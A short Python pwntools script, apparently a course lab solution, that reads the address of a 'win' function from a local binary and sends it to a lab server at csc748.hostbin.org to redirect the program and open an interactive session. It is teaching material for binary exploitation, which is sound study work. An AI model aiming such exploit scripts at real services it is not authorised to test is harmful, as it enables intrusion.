from pwn import *

# Load ELF 
e = ELF("./lab1-2.bin")

"""
Step 1: Find Symbol
    Uncomment lines below to 
    list all symbol names in binary
"""
''''
for symbol_name in e.symbols:
    print(symbol_name)
'''


"""
Step 2: Send Address to Server
    Uncomment lines below to 
    obtain address and send to server.
"""

# Get Symbol Address
addr = e.symbols['win']

# Print Symbol Address 
print(f"address is: {addr}")

# Establish Connection to Server
p = remote("csc748.hostbin.org", 7012)

# Send 'win' Address to Server
p.sendline(str(addr))  # Send the address as a string

# Start Interactive Session
p.interactive()
